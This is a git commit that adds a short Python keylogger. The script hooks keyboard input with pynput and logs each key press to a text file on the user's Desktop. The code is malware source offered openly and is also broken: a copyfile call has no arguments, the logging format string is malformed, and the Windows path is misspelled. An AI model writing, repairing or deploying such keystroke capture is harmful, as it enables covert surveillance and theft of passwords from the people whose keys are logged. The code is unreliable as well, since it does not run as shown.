9570b5b2553eb7cff957d4ea40c78ca1e144e79d
SARANYA B S <75137753+bssaranya@users.noreply.github.com>
2020-12-08 00:01:43 +0530

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,18 @@
+from pynput.keyboard import Listener
+
+import os
+import logging
+from shutil import copyfile
+
+username = os.getlogin()
+logging_directory = f"C:/User/{username}/Desktop"
+
+copyfile()
+
+logging.basicConfig(filename=f"{logging_directory}/mylog.txt",level = logging.DEBUG, format = %s("asctime")s:%(message)s")
+
+def key_handler(key):
+    logging.info(key)
+
+with Listener(on_press=key_handler) as listener:
+    listener.join()
